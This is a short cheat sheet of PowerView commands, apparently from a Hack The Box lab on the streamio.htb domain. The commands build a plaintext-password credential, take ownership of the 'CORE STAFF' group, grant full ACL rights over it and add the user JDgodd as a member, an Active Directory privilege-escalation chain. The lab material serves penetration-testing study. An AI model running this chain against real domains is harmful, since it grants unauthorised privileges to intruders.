# Powervew

% ad


## powerview - Set-up
```
# Load powerview !
upload PowerView.ps1
. .\PowerView.ps1

# If you want to use the function expose in PowerView as another user set :
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
# then pass it using the ! -Cred $Cred
```

## powerview - retrieve password policy
```
Get-DomainPolicy
```

## powerview - set JDgodd as the domain object owner of CORE STAFF using Set-DomainObjectOwner
```
# powerview - set-owner
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
```

## powerview - Grant all rights via the ACL with Add-DomainObjectACL 
```
# powerview- grant all rights via ACL
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
```

## powerview - add JDgodd into the CORE STAFF group 
```
# powerview - add JDgodd into the CORE STAFF group
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
```
